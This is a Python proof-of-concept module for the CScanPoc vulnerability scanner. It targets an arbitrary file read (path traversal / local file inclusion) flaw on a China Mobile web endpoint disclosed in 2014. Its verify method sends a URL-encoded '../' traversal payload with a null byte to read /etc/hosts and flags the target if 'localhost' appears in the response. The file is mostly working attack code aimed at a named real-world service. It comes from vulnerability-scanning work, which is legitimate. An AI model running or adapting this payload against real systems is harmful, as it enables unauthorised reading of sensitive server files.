# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '10086_0101'  # 平台漏洞编号
    name = '中国移动root权限任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-01-10'  # 漏洞公布时间
    desc = '''
    中国移动root权限任意文件读取漏洞，攻击者可以通过本地文件包含来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=44116
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '中国移动'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '91187f5b-6318-4058-b21f-7bd89eccf0fa'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/mbs/img?c=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts%00wap.bjzsjc&s=00000000000000000000000000000000&p=400&appName=%E6%8E%8C%E4%B8%8A%E7%B2%BE%E5%BD%A9&backURL=http%3A%2F%2Fzsjc.bj.monternet.com%2Fbjmobile%2F"
            url = self.target + payload
            response = requests.get(url)
            if response.status_code == 200 and "localhost" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
